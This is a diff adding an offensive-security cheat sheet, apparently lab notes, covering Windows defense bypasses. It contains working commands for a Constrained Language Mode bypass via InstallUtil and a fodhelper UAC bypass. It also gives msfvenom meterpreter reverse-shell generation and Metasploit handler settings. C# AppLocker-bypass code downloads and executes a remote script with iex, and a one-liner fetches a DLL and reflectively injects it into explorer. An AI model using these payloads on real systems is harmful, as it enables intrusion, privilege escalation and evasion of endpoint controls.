@@ -1,0 +1,83 @@
+**********************  CLM Bypass  **********************
+
+// Cheeck if the language mode is available
+
+        # $ExecutionContext.SessionState.LanguageMode 
+        ConstrainedLanguage
+
+        To bypass CLM, we can use https://github.com/calebstewart/bypass-clm
+
+        PS C:\windows\tasks> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
+
+        PS C:\windows\tasks> $ExecutionContext.SessionState.LanguageMode $ExecutionContext.SessionState.LanguageMode
+        FullLanguage
+
+
+**********************  UAC Bypass  **********************
+
+        New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
+        New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+        C:\Windows\System32\fodhelper.exe
+
+# Create reverse shell 
+        sudo msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=192.168.45.220 LPORT=4443 -f exe -o /home/kali/data/shell2.exe
+        
+        msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
+        msf6 exploit(multi/handler) > set EnableStageEncoding true
+        msf6 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
+        msf6 exploit(multi/handler) > set target 1
+        msf6 exploit(multi/handler) > set session 1
+        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+        msf6> set lhost 192.168.45.220
+        msf6> set lport 444
+        msf6> exploit
+
+**********************  Applocker Bypass with Powershell  **********************
+
+# Check language mode
+
+        PS C:\Users\student> $ExecutionContext.SessionState.LanguageMode
+        ConstrainedLanguage
+
+        using System;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Configuration.Install;
+        
+        namespace Bypass
+        {
+            class Program
+            {
+                static void Main(string[] args)
+                {
+                    Console.WriteLine("Nothing going on in this binary.");
+                }
+            }
+            [System.ComponentModel.RunInstaller(true)]
+            public class Sample : Installer
+            {
+                public override void Uninstall(System.Collections.IDictionary savedState)
+                {
+                    String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.214/run1.txt') | iex";
+                    Runspace rs = RunspaceFactory.CreateRunspace();
+                    rs.Open();
+                    PowerShell ps = PowerShell.Create();
+                    ps.Runspace = rs;
+                    ps.AddScript(cmd);
+                    ps.Invoke();
+                    rs.Close();
+                }
+            }
+        }
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe --> Success
+
+
+        # Reflective Injection Resturns
+        
+        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f dll -o met.dll
+        
+        Copy  Invoke-ReflectivePEInjection.ps1 --> /var/wwww/html
+        
+        String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+
